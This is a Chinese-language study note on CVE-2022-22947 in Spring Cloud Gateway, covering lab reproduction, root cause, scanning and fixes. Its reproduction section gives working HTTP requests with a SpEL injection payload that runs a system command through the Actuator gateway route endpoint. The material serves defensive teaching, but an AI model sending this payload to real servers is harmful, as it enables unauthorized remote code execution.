```markdown
# CVE-2022-22947 Spring Cloud Gateway RCE 漏洞笔记
 
## 目录
1. [基本介绍](#基本介绍)
2. [漏洞复现](#漏洞复现)
3. [原理分析](#原理分析)
4. [扫描与修复](#扫描与修复)
5. [法律声明](#法律声明)

---

## 基本介绍

### 微服务架构与 Spring Cloud
- **架构和技术栈**：  
  - 服务注册与发现（Eureka、Consul）  
  - 配置中心（Spring Cloud Config、Nacos）  
  - 网关解决方案（Zuul、Spring Cloud Gateway）  
  - 容错限流（Hystrix、Sentinel）  
  - 监控与调用链追踪（Zipkin、Sleuth）

### Spring Cloud 生态
- **核心组件**：  
  - Eureka、Ribbon、OpenFeign、Hystrix、Zuul  
  - Gateway、Consul、Bus、Stream  
  - Nacos、Sentinel、Seata  

### 网关作用与解决方案
- **网关功能**：  
  - 智能路由、负载均衡、协议转换  
  - 权限校验、限流熔断、API监控  
- **常见方案**：  
  - Netflix Zuul  
  - Spring Cloud Gateway  
  - Kong  
  - Nginx + Lua  

### Spring Cloud Gateway 核心概念
- **三要素**：  
  - **路由（Route）**：定义请求转发规则  
  - **断言（Predicate）**：匹配请求的条件  
  - **过滤器（Filter）**：处理请求和响应的逻辑  

### Spring Boot Actuator
- **功能**：  
  - 健康检查、审计、统计、HTTP追踪  
- **集成配置**：  
  ```properties
  management.endpoint.gateway.enabled=true
  management.endpoints.web.exposure.include=gateway
  ```

---

## 漏洞复现

### 环境搭建
- **启动方式**：  
  1. 本地工程  
  2. Vulhub（Docker Compose）  
  3. Vulfocus.io 靶场  
  4. 自研靶场（如八方网域）  

### 漏洞利用步骤
6. **添加恶意路由过滤器**  
   ```http
   POST /actuator/gateway/routes/hacktest HTTP/1.1
   Host: localhost:9000
   Content-Type: application/json

   {
     "id": "hacktest",
     "filters": [{
       "name": "AddResponseHeader",
       "args": {
         "name": "Result",
         "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream())}"
       }
     }],
     "uri": "http://example.com"
   }
   ```

7. **刷新路由配置**  
   ```http
   POST /actuator/gateway/refresh HTTP/1.1
   Host: localhost:9000
   ```

8. **触发漏洞**  
   ```http
   GET /actuator/gateway/routes/hacktest HTTP/1.1
   Host: localhost:9000
   ```

### 执行结果
- 响应中返回命令执行结果（如当前用户 `whoami`）。

---

## 原理分析

### 漏洞成因
9. **Actuator 接口暴露**：开启 `/actuator/gateway` 接口后，攻击者可动态添加路由。  
10. **SpEL 表达式注入**：`AddResponseHeader` 过滤器的 `value` 字段支持 SpEL 表达式，未做安全过滤。  
11. **动态加载机制**：通过 `/refresh` 接口触发路由更新，恶意表达式被解析执行。  

### 关键代码分析
- **ShortcutConfigurable 类**：  
  在解析过滤器参数时，若值以 `#` 开头，会调用 `SpEL` 解析器执行表达式。  
  ```java
  if (rawValue != null && rawValue.startsWith("#")) {
      Expression expression = parser.parseExpression(rawValue);
      value = expression.getValue(context);
  }
  ```

---

## 扫描与修复

### 影响范围
- Spring Cloud Gateway < 3.1.1  
- Spring Cloud Gateway < 3.0.7  

### 检测工具
- **ZoomEye**：搜索 `app="vmware-SpringBoot-framework"`  
- **批量检测脚本**：如 `scan.py`  

### 修复方案
12. **升级版本**：  
   - Spring Cloud Gateway >= 3.1.1  
   - Spring Cloud Gateway >= 3.0.7  
13. **禁用 Actuator 接口**：  
   ```yaml
   management.endpoint.gateway.enabled: false
   ```
14. **临时缓解**：  
   - 限制 `/actuator/gateway` 接口的访问权限  

---

## 法律声明
> **《中华人民共和国网络安全法》第二十七条**  
> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。  
> **本课程内容仅用于防御性教学演示，严禁用于非法用途。**

```